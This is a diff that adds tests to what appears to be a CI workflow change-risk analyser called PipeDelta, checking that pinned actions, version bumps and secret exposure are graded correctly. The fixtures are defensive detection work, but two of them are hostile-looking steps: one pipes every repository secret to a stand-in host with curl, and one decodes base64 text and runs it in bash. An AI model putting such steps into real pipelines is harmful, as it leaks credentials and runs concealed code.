@@ -131,3 +131,57 @@ def test_action_mode_on_a_real_git_history(tmp_path, monkeypatch, capsys):
     assert "PipeDelta report" in summary.read_text()
     assert "level=high" in output.read_text()
     assert main(["action", "--fail-on", "never"]) == 0
+
+
+def test_fixed_version_is_medium_and_passes_the_default_gate():
+    fixed = (EX / "after-fixed.yml").read_text()
+    findings = compare(BEFORE, fixed)
+    assert overall(findings) == "medium"
+    assert len(findings) == 1
+    assert main(["diff", str(EX / "before.yml"), str(EX / "after-fixed.yml")]) == 0
+
+
+def test_version_bump_of_an_action_already_in_use_is_low():
+    old = BEFORE.replace(
+        "- run: python -m pytest", "- uses: someone/tool@v1\n      - run: python -m pytest"
+    )
+    new = old.replace("someone/tool@v1", "someone/tool@v2")
+    findings = compare(old, new)
+    assert overall(findings) == "low"
+    assert "version" in findings[0].message
+
+
+def test_unlocking_a_pinned_action_is_high():
+    old = BEFORE.replace("- run: python -m pytest", "- uses: someone/tool@" + "a" * 40)
+    new = BEFORE.replace("- run: python -m pytest", "- uses: someone/tool@v2")
+    assert overall(compare(old, new)) == "high"
+
+
+def test_renaming_a_job_does_not_create_high_findings():
+    old = BEFORE.replace(
+        "- run: python -m pytest",
+        "- uses: someone/tool@v1\n        env:\n          K: ${{ secrets.KEY }}",
+    )
+    new = old.replace("  test:", "  unit-tests:")
+    assert overall(compare(old, new)) == "low"
+
+
+def test_to_json_secrets_counts_as_every_secret():
+    new = (
+        BEFORE
+        + '      - run: curl -d "$A" https://x.example.invalid\n        env:\n          A: ${{ toJSON(secrets) }}\n'
+    )
+    findings = compare(BEFORE, new)
+    assert overall(findings) == "high"
+    assert any("every secret" in f.power.name for f in findings)
+
+
+def test_decoded_and_executed_text_is_high():
+    new = BEFORE + "      - run: echo abc | base64 -d | bash\n"
+    findings = compare(BEFORE, new)
+    assert any(f.power.kind == "hidden" and f.level == "high" for f in findings)
+
+
+def test_ordinary_base64_use_is_not_flagged():
+    new = BEFORE + '      - run: echo "$CERT" | base64 -d > cert.pem\n'
+    assert compare(BEFORE, new) == []
